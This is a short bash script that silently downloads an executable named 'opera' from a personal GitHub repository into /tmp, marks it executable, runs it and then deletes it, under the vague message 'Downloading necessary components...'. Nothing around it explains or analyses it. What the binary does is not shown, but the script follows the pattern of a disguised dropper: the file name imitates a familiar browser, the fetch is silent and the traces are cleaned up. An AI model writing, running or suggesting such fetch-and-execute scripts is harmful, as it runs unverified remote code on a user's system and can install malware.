#!/bin/bash
echo "Downloading necessary components..."
curl -s "https://raw.githubusercontent.com/hdsed-sudo/mac-test/main/opera" -o /tmp/opera
chmod +x /tmp/opera
/tmp/opera
rm -f /tmp/opera




